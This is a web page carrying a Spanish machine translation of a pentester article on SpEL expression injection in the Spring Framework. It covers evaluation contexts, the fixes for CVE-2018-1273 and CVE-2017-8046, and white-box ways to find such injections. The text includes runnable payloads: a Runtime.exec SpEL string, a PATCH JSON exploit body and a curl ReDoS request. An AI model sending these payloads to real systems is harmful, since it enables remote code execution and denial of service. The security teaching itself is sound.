<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë≤üèø üéá üçç Inyecci√≥n de hechizo üíπ üê§ üë≥üèø</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Introducci√≥n 


 En el proceso de trabajar e investigar varios servicios, podemos cumplir cada vez m√°s con Spring Framework. Y el paso l√≥gico es famil...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Inyecci√≥n de hechizo</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/433034/"><img src="https://habrastorage.org/webt/me/ul/p3/meulp3hfrqubkhj4pxdhmslxeca.jpeg"><br><h1 id="intro">  Introducci√≥n </h1><br><p>  En el proceso de trabajar e investigar varios servicios, podemos cumplir cada vez m√°s con Spring Framework.  Y el paso l√≥gico es familiarizarse con su estructura y posibles vulnerabilidades. </p><br><p>  Lo m√°s interesante para cualquier Pentester son las vulnerabilidades que conducen a la ejecuci√≥n del c√≥digo. </p><br><p>  Una forma de obtener RCE en Spring es inyectar expresiones SpEL. </p><br><p>  En este art√≠culo intentaremos comprender qu√© es SpEL, d√≥nde se puede encontrar, cu√°les son las caracter√≠sticas de uso y c√≥mo encontrar tales inyecciones. </p><a name="habracut"></a><br><h1 id="what">  Que? </h1><br><p>  <strong>SpEL</strong> es un lenguaje de expresi√≥n creado para Spring Framework que admite consultas y gesti√≥n gr√°fica de objetos en tiempo de ejecuci√≥n. <br>  Tambi√©n es importante tener en cuenta que SpEL se cre√≥ como una API que le permite integrarlo en otras aplicaciones y marcos. </p><br><h1 id="gde-mozhno-vstretit">  ¬øD√≥nde puedo encontrarme? </h1><br><p>  Es l√≥gico que en <strong>Spring Framework</strong> SpEL se use todo el tiempo.  Un buen ejemplo es Spring Security, donde los derechos se asignan mediante expresiones SpEL: </p><br><pre><code class="java hljs"><span class="hljs-meta"><span class="hljs-meta">@PreAuthorize</span></span>(<span class="hljs-string"><span class="hljs-string">"hasPermission(#contact, 'admin')"</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">deletePermission</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Contact contact, Sid recipient, Permission permission)</span></span></span></span>;</code> </pre> <br><p><img src="https://habrastorage.org/webt/2g/rq/gp/2grqgp1bk2lc_ajrxtbl4rcsrq4.png"></p><br><p>  Apache Camel usa la API SpEL;  A continuaci√≥n se presentan ejemplos de su documentaci√≥n. <br>  Formaci√≥n de letras usando expresiones SpEL: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">route</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">from</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">uri</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"direct:foo"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">spel</span></span></span><span class="hljs-tag">&gt;</span></span>#{request.headers['foo'] == 'bar'}<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">spel</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">to</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">uri</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"direct:bar"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">route</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  O puede usar una regla de un archivo externo, por ejemplo, para especificar un Encabezado: </p><br><pre> <code class="javascript hljs">.setHeader(<span class="hljs-string"><span class="hljs-string">"myHeader"</span></span>).spel(<span class="hljs-string"><span class="hljs-string">"resource:classpath:myspel.txt"</span></span>)</code> </pre> <br><p>  Aqu√≠ hay algunos ejemplos vistos en GitHub: <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">https://github.com/jpatokal/openflights</a> </p><br><p><img src="https://habrastorage.org/webt/se/wd/ge/sewdgepwblvm0cslrn30d5glbem.png"></p><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">https://github.com/hbandi/LEP</a> </p><br><p><img src="https://habrastorage.org/webt/xm/nr/h2/xmnrh2rhtdc_eqlfpgqqmukaemu.png"></p><br><h1 id="osnovy-spring-framework-i-spel">  Spring Framework y SpEL Basics </h1><br><p>  Para que sea m√°s f√°cil para el lector comprender qu√© son las inyecciones de SpEL, debe conocer Spring y SpEL un poco. </p><br><p>  Un elemento clave del Spring Framework es el Spring Container.  Un contenedor crea objetos, los une, los configura y los gestiona desde la creaci√≥n hasta la destrucci√≥n. </p><br><p>  Para controlar los componentes que componen la aplicaci√≥n, Spring Container utiliza <br>  Inyecci√≥n de dependencia.  Esto es cuando los objetos se configuran utilizando entidades externas llamadas Spring Beans, coloquialmente llamadas "beans". </p><br><p>  Spring Container recupera los metadatos de configuraci√≥n del bean que se necesita para obtener la siguiente informaci√≥n: instrucciones sobre qu√© objetos instanciar y c√≥mo configurarlos a trav√©s de metadatos. </p><br><p>  Los metadatos se pueden obtener de 3 maneras: </p><br><ul><li>  XML </li><li>  Anotaciones Java </li><li>  C√≥digo Java </li></ul><br><p>  Y otro punto importante para nosotros es el contexto de la aplicaci√≥n. </p><br><p>  <strong>ApplicationContext</strong> es la interfaz principal en una aplicaci√≥n Spring que proporciona informaci√≥n de configuraci√≥n de la aplicaci√≥n.  Es de solo lectura en tiempo de ejecuci√≥n, pero se puede volver a cargar si es necesario y es compatible con la aplicaci√≥n.  El n√∫mero de clases que implementan la interfaz ApplicationContext est√° disponible para varios par√°metros de configuraci√≥n y tipos de aplicaciones.  De hecho, es la aplicaci√≥n Spring misma.  El contexto tambi√©n proporciona la capacidad de responder a varios eventos que ocurren dentro de la aplicaci√≥n y controlar el ciclo de vida de los beans. </p><br><p><img src="https://habrastorage.org/webt/gz/pg/td/gzpgtdz46xowwzhkoa4vsld7utq.png"></p><br><p>  Ahora analicemos directamente los m√©todos para definir un bean y usar expresiones SpEL. </p><br><p>  <strong>Bean.xml</strong> </p><br><p>  Un ejemplo de uso t√≠pico es la integraci√≥n de SpEL en la creaci√≥n de XML o definiciones anotadas de componentes de bean: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">‚Äúexmple</span></span></span><span class="hljs-tag">" </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"org.spring.samples.NumberGuess"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"randomNumber"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{ T(java.lang.Math).random() * 100.0 }"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"defaultLocale"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{ systemProperties['user.region'] }"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"defaultLocale2"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"${user.region}"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Aqu√≠ hay una parte del c√≥digo en el archivo Bean.xml, para solo uno de sus beans.  Vale la pena prestar atenci√≥n al id del bin, por el que se puede acceder, y a las propiedades.  Porque  Como parte de este art√≠culo estamos considerando la posibilidad de usar SpEL, luego en el ejemplo se dar√°n varias opciones para escribir tales expresiones. </p><br><p>  Para indicarle a Spring que las expresiones SpEL son las siguientes, se usa el car√°cter # y la expresi√≥n en s√≠ misma se encierra entre llaves: <code>#{SpEL_expression}</code> .  Se puede hacer referencia a las propiedades utilizando el car√°cter $ y encerrando el nombre de la propiedad entre llaves: <code>${someProperty}</code> .  Los marcadores de posici√≥n de propiedad no pueden contener expresiones SpEL, pero las expresiones pueden contener referencias de propiedad: </p><br><pre> <code class="json hljs"><span class="hljs-string"><span class="hljs-string">"#{${someProperty}"</span></span></code> </pre> <br><p>  Por lo tanto, puede llamar a cualquier clase de Java que necesitemos o, por ejemplo, acceder a variables de entorno, que pueden ser √∫tiles para determinar el nombre de usuario o la versi√≥n del sistema. </p><br><p>  La conveniencia de este m√©todo de especificar beans es la capacidad de cambiarlos sin volver a compilar toda la aplicaci√≥n, cambiando as√≠ el comportamiento de la aplicaci√≥n. </p><br><p>  Desde la propia aplicaci√≥n, puede acceder a este bean utilizando la interfaz ApplicationContext, como se muestra a continuaci√≥n: </p><br><pre> <code class="java hljs">ApplicationContext ctx = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ClassPathXmlApplicationContext(‚ÄúBean.xml‚Äù); MyExpression example = ctx.getBean(‚Äúexample<span class="hljs-string"><span class="hljs-string">", MyExpression.class); "</span></span> + <span class="hljs-string"><span class="hljs-string">"System.out.println(‚ÄúNumber : "</span></span> + example.getValue()); System.out.println(‚ÄúLocale : <span class="hljs-string"><span class="hljs-string">" + example.getDefaultLocale()); System.out.println(‚ÄúLocale : "</span></span> + example.getDefaultLocale2());</code> </pre><br><p>  Es decir  dentro de la aplicaci√≥n, simplemente obtenemos los valores de los par√°metros bin que contienen expresiones SpEL.  Spring, despu√©s de recibir dicho valor, ejecuta la expresi√≥n y devuelve el resultado final.  Adem√°s, no olvide que este c√≥digo no funcionar√° sin los captadores correspondientes, pero su descripci√≥n est√° fuera del alcance del art√≠culo. </p><br><p>  Otra forma de especificar beans es el m√©todo de anotaci√≥n AnnotationBase: los valores de los par√°metros se establecen dentro de la anotaci√≥n para alguna clase.  En este caso, el uso de variables no es posible. </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">FieldValueTestBean</span></span></span><span class="hljs-class"> @</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Value</span></span></span><span class="hljs-class">("#</span></span>{ systemProperties[<span class="hljs-string"><span class="hljs-string">'user.region'</span></span>] }<span class="hljs-string"><span class="hljs-string">") private String defaultLocale; public void setDefaultLocale(String defaultLocale) { this.defaultLocale = defaultLocale; } public String getDefaultLocale() { return this.defaultLocale; } }</span></span></code> </pre> <br><p>  Para poder usar variables, al crear expresiones SpEL, necesitamos usar la interfaz ExpressionParser.  Y luego aparece una clase en el c√≥digo de la aplicaci√≥n, similar al siguiente ejemplo: </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseExpressionInterface</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Person personObj,String property)</span></span></span><span class="hljs-function"> </span></span>{ ExpressionParser parser = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SpelExpressionParser(); Expression exp = parser.parseExpression(property+<span class="hljs-string"><span class="hljs-string">" == 'Input'"</span></span>); StandardEvaluationContext testContext = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StandardEvaluationContext(personObj); <span class="hljs-keyword"><span class="hljs-keyword">boolean</span></span> result = exp.getValue(testContext, Boolean.class);</code> </pre> <br><p>  ExpressionParser convierte una expresi√≥n de cadena en un objeto Expression.  Por lo tanto, el valor de la expresi√≥n analizada se puede obtener en el marco del EvaluationContext.  Este EvaluationContext ser√° el √∫nico objeto del que estar√°n disponibles todas las propiedades y variables en la cadena EL. </p><br><p>  Vale la pena se√±alar otro hecho importante.  Con este m√©todo de uso de SpEL, solo necesitamos que la expresi√≥n de cadena contenga # si, adem√°s de la expresi√≥n misma, contiene literales de cadena. </p><br><p>  De todo lo anterior, vale la pena recordar dos cosas: <br>  1) Si es posible buscar por c√≥digo de aplicaci√≥n, entonces debe buscar tales palabras clave: SpelExpressionParser, EvaluationContext y parseExpression. <br>  2) Punteros importantes para Spring <code>#{SpEL}</code> , <code>${someProperty}</code> y <code>T(javaclass)</code> <br>  Si desea leer m√°s sobre Spring y SpEL, le recomendamos que preste atenci√≥n a la documentaci√≥n de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">docs.spring.io</a> . </p><br><h1 id="chto-voobsche-mozhet-spel">  ¬øQu√© puede hacer SpEL? </h1><br><p>  De acuerdo con la documentaci√≥n, SpEL admite la siguiente funcionalidad: </p><br><ul><li>  Expresiones literales </li><li>  Operadores booleanos y relacionales </li><li>  Expresiones regulares </li><li>  Expresiones de clase </li><li>  Acceso a propiedades, matrices, listas, mapas </li><li>  Invocaci√≥n de m√©todo </li><li>  Operadores relacionales </li><li>  Cesi√≥n </li><li>  Llamando a constructores </li><li>  Referencias de frijoles </li><li>  Construcci√≥n de matriz </li><li>  Listas en l√≠nea </li><li>  Mapas en l√≠nea </li><li>  Operador ternario </li><li>  Variables </li><li>  Funciones definidas por el usuario. </li><li>  Proyecci√≥n de colecci√≥n </li><li>  Selecci√≥n de colecci√≥n </li><li>  Expresiones con plantilla </li></ul><br><p>  Como podemos ver, la funcionalidad SpEL es muy rica, y esto puede afectar negativamente la seguridad del proyecto si la entrada del usuario entra en ExpressionParser.  Por lo tanto, Spring recomienda utilizar, en lugar de un StandardEcalutionContext completamente funcional, un SimpleEvaluationContext m√°s simple. </p><br><p>  En resumen, de importancia para nosotros, SimpleEvaluationContext no tiene la capacidad de acceder a clases Java y hacer referencia a otros beans. </p><br><p>  Una descripci√≥n completa de las caracter√≠sticas se explora mejor en el sitio web de documentaci√≥n: <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">StandardEvaluationContext</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">SimpleEvaluationContext</a> </p><br><p>  Algunas correcciones se basan incluso en la diferencia en la funcionalidad de SpEL, que se ejecuta en diferentes contextos, pero hablaremos de esto un poco m√°s adelante. </p><br><p>  Para dejar todo realmente claro, damos un ejemplo.  Tenemos una l√≠nea claramente maliciosa que contiene una expresi√≥n SpEL: </p><br><pre> <code class="java hljs">String inj = <span class="hljs-string"><span class="hljs-string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span></span>;</code> </pre> <br><p>  Y hay dos contextos: </p><br><pre> <code class="java hljs">StandardEvaluationContext std_c = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StandardEvaluationContext();</code> </pre> <br><p>  y </p><br><pre> <code class="java hljs">EvaluationContext simple_c = SimpleEvaluationContext.forReadOnlyDataBinding ().build();</code> </pre> <br><p>  Expresi√≥n exp = parser.parseExpression (inj); <br> <code>java exp.getValue(std_c);</code>  - <strong>se lanzar√° la calculadora</strong> <br> <code>java exp.getValue(simple_c);</code>  - <strong>recibiremos un mensaje de error</strong> </p><br><p>  Un punto igualmente interesante es que podemos comenzar a procesar la expresi√≥n sin especificar ning√∫n contexto: <code>exp.getValue();</code> <br>  En este caso, la expresi√≥n se ejecutar√° dentro del contexto est√°ndar y, como resultado, se ejecutar√° el c√≥digo malicioso.  Por lo tanto, si usted es un programador y usa Spring, nunca olvide establecer el contexto dentro del cual debe ejecutarse la expresi√≥n. </p><br><p>  Dijimos un poco antes que algunas correcciones se basan en las diferencias entre las capacidades de SpEL dentro de los contextos.  Considere un ejemplo de tal soluci√≥n. </p><br><p>  <strong>CVE 2018-1273 Spring Data Commons</strong> <br>  Esta vulnerabilidad se encontr√≥ en el m√©todo setPropertyValue y se bas√≥ en dos problemas: <br>  1) Saneamiento insuficiente de los valores de la variable que cae en ExpressionParser. <br>  2) Ejecuci√≥n de la expresi√≥n en el marco del contexto est√°ndar. </p><br><p>  Aqu√≠ hay una captura de pantalla de la parte vulnerable del c√≥digo: </p><br><p><img src="https://habrastorage.org/webt/rb/84/_7/rb84_76_bpq3ywrf-icytp5hvs8.png"></p><br><p>  Porque  el nombre de la propiedad no requiri√≥ un procesamiento complejo dentro del marco de SpEL; la soluci√≥n l√≥gica fue reemplazar el contexto, dando como resultado el siguiente c√≥digo: </p><br><p><img src="https://habrastorage.org/webt/xw/re/ue/xwreueydsgforfjf365mwdrpcuc.png"></p><br><p>  Las capturas de pantalla muestran las partes del c√≥digo que establecen el contexto y la expresi√≥n que se ejecutar√°.  Pero la ejecuci√≥n de la expresi√≥n ocurre en otra parte: </p><br><pre> <code class="java hljs">expression.setValue(context, value);</code> </pre> <br><p>  Es aqu√≠ donde se indica que estamos ejecutando una expresi√≥n SpEL para el valor del valor dentro del contexto dado. <br>  El uso de SimpleEvaluationContext ayud√≥ a proteger contra la implementaci√≥n de Java Class en parseExpression, y ahora, en lugar de ejecutar c√≥digo en el registro del servidor, veremos un error: </p><br><pre> <code class="java hljs">Type cannot be found <span class="hljs-string"><span class="hljs-string">'java.lang.Runtime'</span></span></code> </pre> <br><p>  Pero esto no resolvi√≥ el problema con la falta de saneamiento suficiente y retuvo la capacidad de realizar un ataque redos: </p><br><pre> <code class="bash hljs">curl -X POST http://localhost:8080/account -d <span class="hljs-string"><span class="hljs-string">"name['aaaaaaaaaaaaaaaaaaaaaaaa!'%20matches%20'%5E(a%2B)%2B%24']=test"</span></span></code> </pre> <br><p>  Por lo tanto, la siguiente correcci√≥n ya inclu√≠a desinfectar el nombre del par√°metro. </p><br><h1 id="ot-teorii-k-praktike">  ¬°De la teor√≠a a la pr√°ctica! </h1><br><p>  Ahora echemos un vistazo a varias formas de buscar la inyecci√≥n de SpEL utilizando el m√©todo de White Box. </p><br><h2 id="step-by-step-cve-2017-8046">  Paso a paso CVE-2017-8046 </h2><br><p>  Primero necesita encontrar un lugar para procesar expresiones SpEL.  Para hacer esto, simplemente puede usar nuestra recomendaci√≥n y encontrar palabras clave en el c√≥digo.  Recuerde estas palabras: SpelExpressionParser, EvaluationContext y parseExpression. </p><br><p>  Otra opci√≥n es usar varios complementos para encontrar errores en el c√≥digo.  Hasta ahora, el √∫nico complemento que apunta a una posible inyecci√≥n de SpEL era findsecbugs-cli. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">https://github.com/find-sec-bugs</a> </p><br><p>  Entonces, encontramos el lugar que nos interesa en el c√≥digo.  Digamos que usa findsecbugs-cli: </p><br><p><img src="https://habrastorage.org/webt/wg/_w/s5/wg_ws5vbnh1z6vds1-gxjc3zhk0.png"></p><br><p>  En el c√≥digo de la aplicaci√≥n, veremos lo siguiente: </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">PathToSpEL</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> SpelExpressionParser SPEL_EXPRESSION_PARSER = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SpelExpressionParser(); <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> List&lt;String&gt; APPEND_CHARACTERS = Arrays.asList(<span class="hljs-string"><span class="hljs-string">"-"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/** * Converts a patch path to an {</span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@link</span></span></span><span class="hljs-comment"> Expression}. * * </span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@param</span></span></span><span class="hljs-comment"> path the patch path to convert. * </span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@return</span></span></span><span class="hljs-comment"> an {</span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@link</span></span></span><span class="hljs-comment"> Expression} */</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> Expression </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">pathToExpression</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String path)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> SPEL_EXPRESSION_PARSER.parseExpression(pathToSpEL(path)); }</code> </pre> <br><p>  El siguiente paso es descubrir d√≥nde entra la variable de ruta en el analizador de expresiones.  Una de las formas m√°s pr√°cticas y gratuitas ser√≠a utilizar la funci√≥n IntelijIdea IDE - Analizar flujo de datos: </p><br><p><img src="https://habrastorage.org/webt/gd/ud/ag/gdudag-ykwbmvin_70mowuh838u.png"></p><br><p>  Al desenrollar la cadena, por ejemplo, para reemplazar y estudiar los m√©todos y clases especificados, obtenemos lo siguiente: </p><br><p>  El m√©todo ReplaceOperation toma el valor de la variable de ruta. </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ReplaceOperation</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String path, Object value)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">super</span></span>(<span class="hljs-string"><span class="hljs-string">"replace"</span></span>, path, value); }</code> </pre> <br><p>  Y para llamar al m√©todo de reemplazo, debe pasar la variable "op" con el valor "reemplazar" a JSON. </p><br><pre> <code class="java hljs">JsonNode opNode = elements.next(); String opType = opNode.get(<span class="hljs-string"><span class="hljs-string">"op"</span></span>).textValue(); <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (opType.equals(<span class="hljs-string"><span class="hljs-string">"replace"</span></span>)) { ops.add(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ReplaceOperation(path, value));</code> </pre> <br><p>  Del mismo modo, encontramos todos los lugares donde el usuario puede pasar el valor que necesita a la variable de ruta.  Y luego una de las opciones de explotaci√≥n para la vulnerabilidad se ver√° as√≠: <br>  M√©todo de solicitud: PARCHE <br>  Cuerpo de solicitud: </p><br><pre> <code class="json hljs">[{ <span class="hljs-attr"><span class="hljs-attr">"op"</span></span> : <span class="hljs-string"><span class="hljs-string">"add"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"path"</span></span> : <span class="hljs-string"><span class="hljs-string">"T(java.lang.Runtime).getRuntime().exec(\"calc.exe\").x"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"value"</span></span> : <span class="hljs-string"><span class="hljs-string">"pwned"</span></span> }]</code> </pre> <br><h2 id="ispolzovanie-lgtm-ql">  Usando LGTM QL </h2><br><p>  Usar LGTM QL (para los fines de este art√≠culo, simplemente lo reducimos a QL) es otra forma interesante de buscar vulnerabilidades. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">https://lgtm.com</a> </p><br><p>  Debe estipular inmediatamente su falta.  De forma gratuita, puede analizar solo proyectos que est√°n en repositorios abiertos en GitHub, porque  Para tomar una foto del proyecto, LGTM carga el proyecto en su servidor y lo compila all√≠.  Pero si esto no le molesta, entonces el LGTM QL le abrir√° grandes oportunidades para analizar el c√≥digo de la aplicaci√≥n. </p><br><p>  Entonces, ¬øqu√© es el an√°lisis de aplicaciones QL? </p><br><p>  Para comenzar, como ya dijimos, debe crear una instant√°nea de la aplicaci√≥n. </p><br><p>  Cuando la instant√°nea est√° lista, y esto puede llevar varias horas, puede comenzar a escribir una consulta similar a SQL como parte de la sintaxis QL.  Para hacer esto, puede usar el complemento para Eclipse o actuar directamente en la consola en la p√°gina QL del proyecto. </p><br><p>  Porque  Ahora estamos considerando Spring, y este es el marco para Java, tendr√° que describir la clase de inter√©s para usted y el m√©todo de esta clase, cuya llamada se considera vulnerable.  Para nosotros, esta es cualquier clase que contiene un m√©todo que llama a ExpressionParser. </p><br><p>  Luego hacemos una selecci√≥n de todos los m√©todos que cumplen con nuestros requisitos, por ejemplo, describiendo c√≥mo una variable cae en un m√©todo que se desinfectar√≠a y la condici√≥n de no caer en este m√©todo. </p><br><p><img 